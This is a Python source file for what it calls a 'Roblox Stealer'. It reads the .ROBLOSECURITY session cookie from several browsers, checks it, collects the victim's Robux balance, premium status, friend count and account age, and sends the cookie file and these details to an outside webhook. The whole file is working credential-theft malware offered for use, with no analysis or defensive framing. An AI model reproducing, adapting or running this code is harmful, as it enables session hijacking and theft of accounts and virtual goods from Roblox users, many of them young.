import requests
import robloxpy
import json
import browser_cookie3
import os
from config import hook

user = os.path.expanduser("~")

def get_roblox_cookie():
    browsers = {
        'chrome': browser_cookie3.chrome,
        'brave': browser_cookie3.brave,
        'firefox': browser_cookie3.firefox,
        'chromium': browser_cookie3.chromium,
        'edge': browser_cookie3.edge,
        'opera': browser_cookie3.opera
    }

    for browser_name, browser_func in browsers.items():
        try:
            cookies = browser_func(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except Exception as e:
            print(f"Error retrieving cookies from {browser_name}: {e}")
    
    return None

def rbxsteal():
    roblox_cookie = get_roblox_cookie()
    
    if roblox_cookie:
        if robloxpy.Utils.CheckCookie(roblox_cookie) == "Valid Cookie":
            ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie})
            info = json.loads(ebruh.text)
            
            rid = info["UserID"]
            robux = info['RobuxBalance']
            premium = info['IsPremium']
            username = info['UserName']
            friends = robloxpy.User.Friends.External.GetCount(rid)
            age = robloxpy.User.External.GetAge(rid)
            crdate = robloxpy.User.External.CreationDate(rid)
            
            # Creating URLs
            rolimons = f"https://www.rolimons.com/player/{rid}"
            roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
            headshot = robloxpy.User.External.GetHeadshot(rid)
            limiteds = robloxpy.User.External.GetLimiteds(rid)

            # Write the cookie to a file
            cookie_file_path = os.path.join(user, "AppData", "Local", "Temp", "cookierbx.txt")
            with open(cookie_file_path, "w") as result:
                result.write(roblox_cookie)

            # Prepare payload and headers
            payload = {
                "embeds": [
                    {
                        "title": "Roblox Stealer!",
                        "description": "Github.com/Lawxsz/make-u-own-stealer",
                        "fields": [
                            {"name": "Username", "value": username, "inline": True},
                            {"name": "Robux Balance", "value": robux, "inline": True},
                            {"name": "Premium", "value": premium, "inline": True},
                            {"name": "Builders Club", "value": info.get("IsAnyBuildersClubMember", "N/A"), "inline": True},
                            {"name": "Friends", "value": friends, "inline": True},
                            {"name": "Profile", "value": roblox_profile, "inline": True},
                            {"name": "Age", "value": crdate, "inline": True}
                        ]
                    }
                ]
            }
            headers = {'Content-Type': 'application/json'}
            file = {"file": open(cookie_file_path, 'rb')}
            
            # Send payload and file
            requests.post(hook, data=json.dumps(payload), headers=headers)
            requests.post(hook, files=file)
        else:
            print("Invalid Roblox cookie.")
    else:
        print("No Roblox cookie found.")

if __name__ == "__main__":
    rbxsteal()
